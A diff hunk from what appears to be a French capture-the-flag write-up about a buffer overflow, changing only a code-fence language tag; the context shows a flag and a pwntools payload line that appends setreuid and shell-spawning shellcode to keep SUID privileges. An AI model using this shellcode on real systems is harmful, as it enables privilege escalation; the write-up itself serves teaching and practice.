@@ -177,7 +177,7 @@ OPENNC{BufF3R_0v3r_t3h_F10w}
 
 Pour ceux qui souhaitaient utiliser un bash ou un sh, il est nécessaire de faire un setreuid() avant l'appel du shell afin de récupérer les droits du SUID.
 
-```
+```python
 # Autre possibilité via un shell
 payload += asm(shellcraft.setreuid() + shellcraft.sh())
 p.sendline(payload)
